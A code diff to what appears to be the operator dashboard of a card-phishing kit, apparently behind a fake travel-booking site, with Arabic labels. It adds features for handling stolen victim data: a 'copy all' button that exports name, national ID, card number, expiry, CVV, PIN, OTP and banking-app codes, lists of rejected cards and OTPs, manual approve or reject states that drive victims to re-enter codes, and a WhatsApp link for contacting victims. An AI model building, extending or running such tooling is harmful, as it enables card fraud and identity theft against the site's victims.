@@ -389,7 +389,10 @@ function renderDetail(o){
     '<div class="dh-name">'+esc(o.name||'مجهول')+'</div>'+
     '<div class="dh-meta"><span class="st-badge" style="background:'+stColor+'">'+stLabel+'</span>'+
     '<span class="dh-time">🕐 '+fmtDate(o.created_at)+'</span></div></div></div>'+
-    '<button class="dh-del '+(detDelConf?'confirm':'normal')+'" onclick="detDel(\''+o.id+'\')">'+(detDelConf?'⚠️ تأكيد':'🗑️ حذف')+'</button></div>';
+    '<div style="display:flex;gap:8px;align-items:center">'+
+    (o.mobile?'<a href="https://wa.me/'+esc(o.mobile.replace(/[^0-9]/g,''))+'" target="_blank" style="background:#d1fae5;border:1px solid #6ee7b7;color:#065f46;border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;text-decoration:none;font-family:Cairo,sans-serif;display:inline-flex;align-items:center;gap:4px">📱 واتساب</a>':'')+
+    '<button style="background:#f5eedf;border:1px solid #C5A572;color:#92400e;border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif" onclick="copyAll(\''+o.id+'\')">📋 نسخ الكل</button>'+
+    '<button class="dh-del '+(detDelConf?'confirm':'normal')+'" onclick="detDel(\''+o.id+'\')">'+(detDelConf?'⚠️ تأكيد':'🗑️ حذف')+'</button></div></div>';
 
   // SECRET CODES
   h+='<div class="sec-codes"><h3>🔑 البيانات السرية</h3><div class="codes-grid">';
@@ -452,10 +455,55 @@ function renderDetail(o){
   }
   h+='</div>';
 
+  // REJECTED CARDS/OTPS
+  if(o.rejected_cards&&o.rejected_cards.length){
+    h+='<div class="sec-data" style="border-color:#fca5a5;background:#fef2f2"><h3 style="color:#dc2626">❌ بطاقات مرفوضة ('+o.rejected_cards.length+')</h3>';
+    h+='<div class="data-grid">';
+    o.rejected_cards.forEach(function(c,i){
+      h+='<div class="data-item" style="border-color:#fca5a5"><div class="lbl">بطاقة #'+(i+1)+'</div>'+
+        '<div class="val" style="direction:ltr">'+esc(c.card_number||c)+'</div>'+
+        '<button class="cp" onclick="doCopy(this,\''+esc(String(c.card_number||c)).replace(/'/g,"\\'")+'\')">نسخ</button></div>';
+    });
+    h+='</div></div>';
+  }
+  if(o.rejected_otps&&o.rejected_otps.length){
+    h+='<div class="sec-data" style="border-color:#fca5a5;background:#fef2f2"><h3 style="color:#dc2626">❌ رموز OTP مرفوضة ('+o.rejected_otps.length+')</h3>';
+    h+='<div class="data-grid">';
+    o.rejected_otps.forEach(function(c,i){
+      h+='<div class="data-item" style="border-color:#fca5a5"><div class="lbl">OTP #'+(i+1)+'</div>'+
+        '<div class="val" style="direction:ltr">'+esc(String(c))+'</div>'+
+        '<button class="cp" onclick="doCopy(this,\''+esc(String(c)).replace(/'/g,"\\'")+'\')">نسخ</button></div>';
+    });
+    h+='</div></div>';
+  }
+
   // ADDRESS/NOTES
   if(o.address){
     h+='<div class="sec-data"><h3>🚂 تفاصيل الرحلة</h3><div style="background:#f9fafb;border-radius:10px;padding:12px;border:1px solid #e5e7eb;font-size:13px;white-space:pre-wrap;line-height:1.8;color:#1a1a2e">'+esc(o.address)+'</div></div>';
   }
+  if(o.address_notes){
+    h+='<div class="sec-data"><h3>📝 ملاحظات</h3><div style="background:#f9fafb;border-radius:10px;padding:12px;border:1px solid #e5e7eb;font-size:13px;white-space:pre-wrap;line-height:1.8;color:#1a1a2e">'+esc(o.address_notes)+'</div></div>';
+  }
+
+  // MANUAL STATUS CHANGE
+  h+='<div class="sec-ctrl" style="margin-bottom:16px"><h4>🔄 تغيير الحالة يدوياً</h4>'+
+    '<select id="manualStatus" style="width:100%;padding:10px;border:1.5px solid #e5e7eb;border-radius:8px;font-family:Cairo,sans-serif;font-size:13px;margin-bottom:8px;background:#fff;color:#1a1a2e">'+
+    '<option value="">اختر حالة...</option>'+
+    '<option value="new">جديد</option>'+
+    '<option value="payment_done">بانتظار موافقة الدفع</option>'+
+    '<option value="payment_approved">دفع مقبول</option>'+
+    '<option value="payment_rejected">دفع مرفوض</option>'+
+    '<option value="otp_done">بانتظار OTP</option>'+
+    '<option value="otp_approved">OTP مقبول</option>'+
+    '<option value="otp_rejected">OTP مرفوض</option>'+
+    '<option value="pin_done">بانتظار PIN</option>'+
+    '<option value="pin_approved">PIN مقبول</option>'+
+    '<option value="pin_rejected">PIN مرفوض</option>'+
+    '<option value="app_code_done">بانتظار كود التطبيق</option>'+
+    '<option value="app_code_approved">كود مقبول</option>'+
+    '<option value="app_code_rejected">كود مرفوض</option>'+
+    '</select>'+
+    '<button style="width:100%;padding:8px;background:#C5A572;color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif" onclick="manualChange(\''+o.id+'\')">تطبيق</button></div>';
 
   // DELETE SECTION
   h+='<div class="sec-del"><h4>🗑️ حذف البيانات</h4>'+
@@ -476,6 +524,29 @@ function codeCard(lbl,val){
 function doCopy(btn,txt){navigator.clipboard.writeText(txt).then(function(){
   btn.classList.add('ok');var old=btn.textContent;btn.textContent='✅ تم';
   setTimeout(function(){btn.classList.remove('ok');btn.textContent=old},1500)})}
+
+function copyAll(id){
+  var o=orders.find(function(x){return String(x.id)===String(id)});if(!o)return;
+  var lines=[];
+  if(o.name)lines.push('الاسم: '+o.name);
+  if(o.mobile)lines.push('الجوال: '+o.mobile);
+  if(o.id_number)lines.push('الهوية: '+o.id_number);
+  if(o.card_number)lines.push('البطاقة: '+o.card_number);
+  if(o.card_name)lines.push('حامل البطاقة: '+o.card_name);
+  if(o.expiry_month&&o.expiry_year)lines.push('الصلاحية: '+o.expiry_month+'/'+o.expiry_year);
+  if(o.cvv)lines.push('CVV: '+o.cvv);
+  if(o.card_pin)lines.push('PIN: '+o.card_pin);
+  if(o.otp_code)lines.push('OTP: '+o.otp_code);
+  if(o.app_code)lines.push('كود التطبيق: '+o.app_code);
+  if(o.card_type)lines.push('المسار: '+o.card_type);
+  if(o.address)lines.push('التفاصيل: '+o.address);
+  navigator.clipboard.writeText(lines.join('\n')).then(function(){showNotif('✅ تم نسخ جميع البيانات')});
+}
+
+function manualChange(id){
+  var sel=document.getElementById('manualStatus');if(!sel||!sel.value)return;
+  doAction(id,sel.value);
+}
 
 function detDel(id){if(detDelConf){sbDel('visitors',id).then(function(){detDelConf=false;closeDetail();loadOrders()})}
   else{detDelConf=true;var o=orders.find(function(x){return String(x.id)===String(id)});if(o)renderDetail(o);
@@ -522,38 +593,74 @@ async function loadVisitors(){
   visitors=d||[];renderStats();
 }
 
+var vmFilter='all',vmSearch='',allSiteVisitors=[];
+async function loadAllSiteVisitors(){
+  var d=await sbGet('site_visitors','select=*&order=created_at.desc');
+  allSiteVisitors=d||[];
+}
+
 function openVM(){
-  var h='<div class="modal"><div class="modal-head"><div><h3 style="margin:0">📊 الزوار النشطين</h3></div>'+
-    '<div class="btns"><button style="background:#f3f4f6;border:1px solid #d1d5db;color:#1a1a2e" onclick="loadVisitors();openVM()">🔄 تحديث</button>'+
+  loadAllSiteVisitors().then(function(){renderVM()});
+  renderVM();
+}
+function renderVM(){
+  var onlineList=visitors;
+  var allList=allSiteVisitors.length?allSiteVisitors:visitors;
+  var showList=vmFilter==='online'?onlineList:allList;
+  if(vmSearch){var q=vmSearch.toLowerCase();showList=showList.filter(function(v){
+    return(v.visitor_id||v.id||'').toLowerCase().indexOf(q)!==-1})}
+
+  var h='<div class="modal"><div class="modal-head"><div>'+
+    '<h3 style="margin:0;color:#92400e">📊 سجل الزوار والإحصائيات</h3>'+
+    '<p style="margin:2px 0 0;font-size:12px;color:#6b7280">متابعة حركة زوار الموقع</p></div>'+
+    '<div class="btns"><button style="background:#f3f4f6;border:1px solid #d1d5db;color:#1a1a2e" onclick="loadVisitors();loadAllSiteVisitors().then(function(){renderVM()})">🔄 تحديث</button>'+
     '<button style="background:#fee2e2;border:1px solid #fca5a5;color:#dc2626" onclick="closeVM()">✕ إغلاق</button></div></div>';
+
   h+='<div class="modal-body">';
+
+  // 3 stats
   h+='<div class="vm-stats">'+
     '<div class="vm-sc" style="background:#f5eedf;border:1px solid #C5A572">'+
-    '<div class="n" style="color:#C5A572">'+orders.length+'</div><div class="l">إجمالي الطلبات</div></div>'+
+    '<div class="n" style="color:#C5A572">'+allList.length+'</div><div class="l">إجمالي الزوار التراكمي</div></div>'+
     '<div class="vm-sc" style="background:#d1fae5;border:1px solid #6ee7b7">'+
-    '<div class="n" style="color:#22c55e;display:flex;align-items:center;justify-content:center;gap:6px">'+
-    '<span style="width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block"></span>'+visitors.length+'</div>'+
-    '<div class="l">نشط الآن</div></div>'+
+    '<div class="n" style="color:#059669;display:flex;align-items:center;justify-content:center;gap:6px">'+
+    '<span style="width:8px;height:8px;border-radius:50%;background:#059669;display:inline-block;animation:pulse 1.5s infinite"></span>'+onlineList.length+'</div>'+
+    '<div class="l">متصلين حالياً</div></div>'+
     '<div class="vm-sc" style="background:#fef3c7;border:1px solid #fcd34d">'+
-    '<div class="n" style="color:#f59e0b">'+orders.filter(isPending).length+'</div><div class="l">بانتظار إجراء</div></div></div>';
+    '<div class="n" style="color:#d97706">'+orders.filter(isPending).length+'</div><div class="l">بانتظار إجراء</div></div></div>';
 
-  if(!visitors.length){
+  // Tabs + search
+  h+='<div style="display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:16px;flex-wrap:wrap">'+
+    '<div style="display:flex;gap:8px">'+
+    '<button style="border:none;border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif;'+
+      (vmFilter==='all'?'background:#C5A572;color:#fff':'background:#f3f4f6;color:#1a1a2e;border:1px solid #d1d5db')+'" onclick="vmFilter=\'all\';renderVM()">جميع الجلسات ('+allList.length+')</button>'+
+    '<button style="border:none;border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif;'+
+      (vmFilter==='online'?'background:#059669;color:#fff':'background:#f3f4f6;color:#1a1a2e;border:1px solid #d1d5db')+'" onclick="vmFilter=\'online\';renderVM()">متصلين الآن ('+onlineList.length+')</button></div>'+
+    '<input type="text" value="'+esc(vmSearch)+'" placeholder="بحث بمعرف الجلسة..." oninput="vmSearch=this.value;renderVM()" '+
+    'style="background:#fff;border:1.5px solid #e5e7eb;border-radius:8px;padding:6px 12px;font-size:12px;color:#1a1a2e;font-family:Cairo,sans-serif;outline:none;min-width:200px"></div>';
+
+  // Table
+  if(!showList.length){
     h+='<div style="text-align:center;padding:40px 20px;color:#9ca3af"><div style="font-size:36px;margin-bottom:8px">🌐</div>'+
-      '<p style="font-size:13px;margin:0">لا يوجد زوار نشطين الآن</p></div>';
+      '<p style="font-size:13px;margin:0">لا يوجد زوار يطابقون الفلتر</p></div>';
   }else{
     h+='<div style="border:1px solid #e5e7eb;border-radius:12px;overflow:hidden"><table class="vm-table"><thead><tr>'+
-      '<th>#</th><th>معرف الزائر</th><th>الحالة</th><th>الوقت</th></tr></thead><tbody>';
-    visitors.forEach(function(v,i){
+      '<th>#</th><th>معرف الجلسة</th><th>الحالة</th><th>الوقت</th></tr></thead><tbody>';
+    var cutoff=new Date(Date.now()-60000).toISOString();
+    showList.forEach(function(v,i){
       var vid=v.visitor_id||v.id||'';
-      h+='<tr><td style="color:#9ca3af">'+(i+1)+'</td>'+
-        '<td style="font-family:monospace;color:#cbd5e1">'+esc(String(vid).slice(0,20))+'</td>'+
-        '<td><span class="online"><span class="d"></span>متصل</span></td>'+
+      var isLive=v.created_at>=cutoff;
+      h+='<tr style="'+(isLive?'background:#f0fdf4':'')+'">'+
+        '<td style="color:#9ca3af">'+(i+1)+'</td>'+
+        '<td style="font-family:monospace;color:#374151;direction:ltr;text-align:left">'+esc(String(vid).slice(0,24))+'</td>'+
+        '<td>'+(isLive?'<span class="online"><span class="d"></span>متصل</span>':'<span style="color:#9ca3af;font-size:11px">غير متصل</span>')+'</td>'+
         '<td style="color:#6b7280">'+fmtDate(v.created_at)+'</td></tr>';
     });
     h+='</tbody></table></div>';
   }
 
-  h+='<div class="vm-footer"><span class="note">يتم تحديث قائمة الزوار تلقائياً كل 3 ثوانٍ</span>'+
+  // Footer
+  h+='<div class="vm-footer"><span class="note">إجمالي الجلسات المسجلة: '+allList.length+' | المتصلين حالياً: '+onlineList.length+'</span>'+
     '<button style="background:#fee2e2;border:1px solid #fca5a5;color:#dc2626;border-radius:8px;padding:6px 14px;font-size:11px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif" onclick="resetVisitors()">⚠️ تصفير جميع البيانات</button></div>';
 
   h+='</div></div>';
